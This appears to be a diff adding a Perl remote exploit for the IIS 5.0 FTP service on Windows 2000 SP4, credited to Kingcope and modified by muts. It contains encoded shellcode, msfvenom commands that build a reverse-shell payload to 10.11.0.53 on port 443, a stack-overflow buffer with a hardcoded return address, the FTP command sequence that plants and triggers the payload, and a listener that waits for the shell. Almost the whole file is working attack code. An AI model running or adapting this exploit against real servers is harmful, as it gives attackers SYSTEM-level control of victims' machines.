@@ -1,0 +1,149 @@
+#!/usr/bin/perl
+# IIS 5.0 FTP Server / Remote SYSTEM exploit 
+# Win2k SP4 targets 
+# bug found & exploited by Kingcope, kcope2<at>googlemail.com 
+# Affects IIS6 with stack cookie protection 
+# Modded by muts, additional egghunter added for secondary larger payload
+# Might take a minute or two for the egg to be found.
+# Opens reverse shell to 10.11.0.53 on port 443
+
+# http://www.offensive-security.com/0day/msftp.pl.txt
+
+use IO::Socket; 
+$|=1; 
+$sc = "\x89\xe2\xdd\xc5\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x43" .
+"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34" .
+"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41" .
+"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58" .
+"\x50\x38\x41\x43\x4a\x4a\x49\x45\x36\x4d\x51\x48\x4a\x4b\x4f" .
+"\x44\x4f\x47\x32\x46\x32\x42\x4a\x43\x32\x46\x38\x48\x4d\x46" .
+"\x4e\x47\x4c\x45\x55\x51\x4a\x44\x34\x4a\x4f\x48\x38\x46\x34" .
+"\x50\x30\x46\x50\x50\x57\x4c\x4b\x4b\x4a\x4e\x4f\x44\x35\x4a" .
+"\x4a\x4e\x4f\x43\x45\x4b\x57\x4b\x4f\x4d\x37\x41\x41";
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.53 LPORT=443 > payload
+# perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj
+# cat stackadj payload > shellcode
+# cat shellcode | msfvenom -b "\x00\x09\x0c\x20\x0a\x0d\x0b" -e x86/shikata_ga_nai -f c --platform win -a x86
+# Payload size: 357 bytes + 17 NOPs
+
+$shell="T00WT00W" ."\xbd\x1b\xa6\x43\xb9\xdd\xc0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1" .
+"\x53\x83\xea\xfc\x31\x6a\x10\x03\x6a\x10\xf9\x53\xc2\x55\x51" .
+"\x96\xc5\xa5\x55\x41\x47\xa5\xa5\x92\x28\x2f\x40\xa3\x68\x4b" .
+"\x01\x94\x58\x1f\x47\x19\x12\x4d\x73\xaa\x56\x5a\x74\x1b\xdc" .
+"\xbc\xbb\x9c\x4d\xfc\xda\x1e\x8c\xd1\x3c\x1e\x5f\x24\x3d\x67" .
+"\x82\xc5\x6f\x30\xc8\x78\x9f\x35\x84\x40\x14\x05\x08\xc1\xc9" .
+"\xde\x2b\xe0\x5c\x54\x72\x22\x5f\xb9\x0e\x6b\x47\xde\x2b\x25" .
+"\xfc\x14\xc7\xb4\xd4\x64\x28\x1a\x19\x49\xdb\x62\x5e\x6e\x04" .
+"\x11\x96\x8c\xb9\x22\x6d\xee\x65\xa6\x75\x48\xed\x10\x51\x68" .
+"\x22\xc6\x12\x66\x8f\x8c\x7c\x6b\x0e\x40\xf7\x97\x9b\x67\xd7" .
+"\x11\xdf\x43\xf3\x7a\xbb\xea\xa2\x26\x6a\x12\xb4\x88\xd3\xb6" .
+"\xbf\x25\x07\xcb\xe2\x21\xe4\xe6\x1c\xb2\x62\x70\x6f\x80\x2d" .
+"\x2a\xe7\xa8\xa6\xf4\xf0\xcf\x9c\x41\x6e\x2e\x1f\xb2\xa7\xf5" .
+"\x4b\xe2\xdf\xdc\xf3\x69\x1f\xe0\x21\x3d\x4f\x4e\x9a\xfe\x3f" .
+"\x2e\x4a\x97\x55\xa1\xb5\x87\x56\x6b\xde\x22\xad\xfc\xeb\xb9" .
+"\xad\xc9\x83\xbf\xad\x30\xef\x49\x4b\x58\x1f\x1c\xc4\xf5\x86" .
+"\x05\x9e\x64\x46\x90\xdb\xa7\xcc\x17\x1c\x69\x25\x5d\x0e\x1e" .
+"\xc5\x28\x6c\x89\xda\x86\x18\x55\x48\x4d\xd8\x10\x71\xda\x8f" .
+"\x75\x47\x13\x45\x68\xfe\x8d\x7b\x71\x66\xf5\x3f\xae\x5b\xf8" .
+"\xbe\x23\xe7\xde\xd0\xfd\xe8\x5a\x84\x51\xbf\x34\x72\x14\x69" .
+"\xf7\x2c\xce\xc6\x51\xb8\x97\x24\x62\xbe\x97\x60\x14\x5e\x29" .
+"\xdd\x61\x61\x86\x89\x65\x1a\xfa\x29\x89\xf1\xbe\x5a\xc0\x5b" .
+"\x96\xf2\x8d\x0e\xaa\x9e\x2d\xe5\xe9\xa6\xad\x0f\x92\x5c\xad" .
+"\x7a\x97\x19\x69\x97\xe5\x32\x1c\x97\x5a\x32\x35\x90\x90\x90" .
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+
+print "IIS 5.0 FTPd / Remote r00t exploit by kcope V1.2\n"; 
+if ($#ARGV ne 1) { 
+print "usage: iiz5.pl <target> <your local ip>\n"; 
+exit(0); 
+} 
+srand(time()); 
+$port = int(rand(31337-1022)) + 1025; 
+$locip = $ARGV[1]; 
+$locip =~ s/\./,/gi; 
+if (fork()) { 
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0], 
+                              PeerPort => '21', 
+                              Proto    => 'tcp'); 
+# $patch = "\x7E\xF1\xFA\x7F"; # From original sploit
+$patch = "\xFD\x7F\xFD\x7F"; # Ripped from Metasploit
+# $retaddr = "\x9B\xB1\xF4\x77"; # JMP ESP univ on 2 win2k SP4 platforms 
+# $retaddr = "\x7B\x30\xE4\x77"; # JMP ESP univ on 2 win2k SP4 + Rollup + Fully Patched
+$retaddr = "\xD8\x2E\xE4\x77"; # jmp esp in user32.dll (English / 5.0.2195.7032)
+$v = "KSEXY" . $sc . "V" x (500-length($sc)-5); 
+# top address of stack frame where shellcode resides, is hardcoded inside this block 
+$findsc="\xB8\x55\x55\x52\x55\x35\x55\x55\x55\x55\x40\x81\x38\x53" 
+   ."\x45\x58\x59\x75\xF7\x40\x40\x40\x40\xFF\xFF\xE0"; 
+
+# attack buffer 
+$c = $findsc . "C" . ($patch x (76/4)) . $patch.$patch. 
+   ($patch x (52/4)) .$patch."EEEE$retaddr".$patch. 
+   "HHHHIIII". 
+$patch."JKKK"."\xE9\x63\xFE\xFF\xFF\xFF\xFF"."NNNN"; 
+$x = <$sock>; 
+print $x;                             
+print $sock "USER anonymous\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "PASS $shell\r\n";
+$x = <$sock>; 
+print $x; 
+print $sock "USER anonimoos\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "PASS $shell\r\n";
+$x = <$sock>; 
+print $x; 
+
+print $sock "USER anonymous\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "PASS anonymous\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "MKD w00t$port\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "SITE $v\r\n"; # We store shellcode in memory of process (stack) 
+$x = <$sock>; 
+print $x; 
+print $sock "SITE $v\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "SITE $v\r\n"; 
+$x = <$sock>;
+print $x; 
+print $sock "SITE $v\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "SITE $v\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "CWD w00t$port\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "MKD CCC". "$c\r\n"; 
+$x = <$sock>; 
+print $x; 
+print $sock "PORT $locip," . int($port / 256) . "," . int($port % 256) . "\r\n"; 
+$x = <$sock>; 
+print $x; 
+# TRIGGER 
+print $sock "NLST $c*/../C*/\r\n"; 
+$x = <$sock>; 
+print $x; 
+while (1) {} 
+} else { 
+my $servsock = IO::Socket::INET->new(LocalAddr => "0.0.0.0", LocalPort => $port, Proto => 'tcp', Listen => 1); 
+die "Could not create socket: $!\n" unless $servsock; 
+my $new_sock = $servsock->accept(); 
+while(<$new_sock>) { 
+print $_; 
+} 
+close($servsock); 
+} 
+#Cheerio, 
+# 
+#Kingcope
+
